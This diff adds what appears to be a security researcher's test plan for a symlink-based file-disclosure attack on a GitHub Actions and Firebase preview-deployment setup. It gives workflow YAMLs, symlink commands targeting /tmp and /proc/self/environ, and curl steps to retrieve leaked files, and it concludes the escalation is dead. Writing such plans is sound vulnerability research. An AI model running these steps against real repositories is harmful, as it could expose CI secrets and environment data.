@@ -1,0 +1,111 @@
+1. revised repo/workflow structure
+Primary Repository (Controlled by You):
+- `firebase.json` (Valid Firebase Hosting config pointing to `public: "firebase-public-dir"`)
+- `.github/workflows/pr-build.yml` (Unprivileged build workflow present on `main`)
+- `.github/workflows/deploy-preview.yml` (Privileged deployment workflow present on `main`)
+- `src/` (Source code directory)
+  - `index.html` (e.g., `<h1>Valid Project</h1>`)
+- Settings > Secrets: `FIREBASE_SERVICE_ACCOUNT`
+
+Attacker Fork:
+- An independent GitHub account forks the Primary Repository.
+
+corrected attacker model
+A malicious contributor (Attacker Fork) opens a standard Pull Request against the Primary Repository's default branch. The attacker modifies **only** the contents of the `src/` directory (adding crafted symlinks via malicious commits or build scripts), relying entirely on the Primary Repository's existing, unmodified `pr-build.yml` workflow to unknowingly package these symlinks into the build artifact. The attacker does not modify or require write access to any workflow files.
+
+3. revised workflow YAMLs
+
+**Primary Repo: `.github/workflows/pr-build.yml` (on `main`)**
+```yaml
+name: PR Build
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build Artifact (Simulating unprivileged build)
+        run: |
+          mkdir -p dist
+          # Simulating a build step that preserves symlinks (e.g., a custom script executing cp -a)
+          cp -a src/* dist/ 2>/dev/null || true
+
+      - name: Pack and Upload (High-fidelity dev-infra mimic)
+        # Using the exact angular/dev-infra packing action logic
+        # Note: angular/dev-infra's pack-and-upload-artifact uses `tar -chzvf`, which explicitly dereferences symlinks.
+        uses: angular/dev-infra/github-actions/previews/pack-and-upload-artifact@main
+        with:
+          workflow-artifact-name: preview-artifact
+          pull-number: ${{ github.event.pull_request.number }}
+          artifact-build-revision: ${{ github.event.pull_request.head.sha }}
+          deploy-directory: dist
+```
+
+**Primary Repo: `.github/workflows/deploy-preview.yml`**
+```yaml
+name: Deploy Preview
+on:
+  workflow_run:
+    workflows: ["PR Build"]
+    types: [completed]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    if: ${{ github.event.workflow_run.conclusion == 'success' }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Create Privileged Marker File
+        run: |
+          echo "SECRET_WORKFLOW_DATA=This is highly sensitive data from the privileged runner." > /tmp/poc-marker.txt
+          chmod 600 /tmp/poc-marker.txt
+
+      - name: Upload Artifacts to Firebase (High-fidelity dev-infra mimic)
+        uses: angular/dev-infra/github-actions/previews/upload-artifacts-to-firebase@main
+        env:
+          POC_MARKER: "SAFE_ENV_LEAK_TEST"
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          workflow-artifact-name: preview-artifact
+          firebase-public-dir: firebase-public-dir
+          firebase-project-id: your-firebase-project-id
+          firebase-service-key: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+```
+
+4. exact privileged-created marker design
+The privileged workflow explicitly creates a marker file at an absolute path **before** the extraction and deployment steps:
+```bash
+echo "SECRET_WORKFLOW_DATA=This is highly sensitive data from the privileged runner." > /tmp/poc-marker.txt
+chmod 600 /tmp/poc-marker.txt
+```
+This file sits entirely outside the `firebase-public-dir` intended for deployment.
+
+5. exact validation steps and evidence to save
+1. In your Attacker Fork, commit a symlink into the `src/` directory pointing to the privileged marker file:
+   `ln -s /tmp/poc-marker.txt src/leak-marker.txt`
+   And optionally a secondary target:
+   `ln -s /proc/self/environ src/leak-env`
+2. Open a Pull Request from the fork to the primary repository.
+3. Wait for the `Deploy Preview` workflow to finish in the primary repository's Actions tab.
+4. Obtain the Firebase preview URL from the action logs of the `FirebaseExtended/action-hosting-deploy` step.
+5. **Primary Validation:** Safely request the primary marker file from the preview URL:
+   `curl -sO https://<preview-url>/leak-marker.txt`
+   Check if the file successfully downloaded and contains `SECRET_WORKFLOW_DATA=This is highly sensitive data from the privileged runner.`
+6. **Secondary Validation:** Safely retrieve and parse the environment block without fragile parsing:
+   `curl -sO https://<preview-url>/leak-env`
+   `cat leak-env | tr '\0' '\n' > parsed-env.txt`
+   Inspect `parsed-env.txt` for `POC_MARKER=SAFE_ENV_LEAK_TEST`.
+7. **Evidence to Save:**
+   - A screenshot of the unprivileged PR build logs showing the `pack-and-upload-artifact` step behavior (e.g., successful completion or failure due to broken symlinks).
+   - A screenshot of the privileged `Deploy Preview` logs showing the `tar -xvzf` extraction and Firebase deployment.
+   - If retrieval succeeds, the raw downloaded `leak-marker.txt` and `leak-env` files, and a screenshot of the terminal output demonstrating the successful `cat` / parsing of both files.
+
+6. what result counts as:
+- **validated stronger escalation:** The `curl` command successfully retrieves `leak-marker.txt` containing the exact string written by the privileged runner, demonstrating arbitrary deterministic file read.
+- **reportable core only:** N/A for this test, since the core finding *is* the out-of-tree read via symlinks. If it succeeds, it's an escalation. If it fails, it's dead.
+- **dead escalation:** The unprivileged `pack-and-upload-artifact` action explicitly uses `tar -chzvf` (the `-h` flag dereferences symlinks). Consequently, the malicious symlinks are either dereferenced into regular files containing the *unprivileged* runner's data (if the target exists, like `/proc/self/environ`), or the `tar` command fails with a "Cannot stat: No such file or directory" error (if the target doesn't exist on the unprivileged runner, like `/tmp/poc-marker.txt`). Because the resulting artifact does not contain actual symlinks, the privileged workflow extracts regular files, and no out-of-tree file disclosure occurs on the privileged runner. The underlying deployment mechanism remains completely secure under the constraint of not modifying the workflow file.
